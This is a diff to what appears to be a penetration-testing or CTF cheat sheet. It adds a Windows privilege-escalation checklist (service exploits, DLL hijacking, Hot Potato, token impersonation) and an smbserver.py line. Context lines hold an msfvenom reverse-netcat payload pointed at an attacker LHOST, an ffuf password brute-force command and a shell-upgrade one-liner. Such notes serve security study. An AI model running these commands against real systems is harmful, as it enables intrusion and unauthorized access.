@@ -242,7 +242,25 @@ openssl passwd "password"
 https://gtfobins.github.io/
 ``` 
 ## Windows Privilege Escalation
+- [ ] Kernel Exploits
+- [ ] Service Exploits
+  - [ ] Insecure Service Properties
+  - [ ] Unquoted Service Path
+  - [ ] Weak Registry Permissions
+  - [ ] Insecure Service Executables
+  - [ ] DLL Hijacking
+- [ ] Registry Exploits
+- [ ] Passwords
+- [ ] Scheduled Tasks
+- [ ] Insecure GUI Apps
+- [ ] Startup Apps
+- [ ] Installed Apps
+- [ ] Hot Potato
+- [ ] Token Impersonation
+- [ ] Port Forwarding
+```bash
 
+```
 ## Useful Commands
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
@@ -305,3 +323,5 @@ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Cr
 
 msfvenom -p cmd/unix/reverse_netcat LHOST=10.50.105.183 LPORT=443
 https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+
+ smbserver.py Lab "/path/to/file"
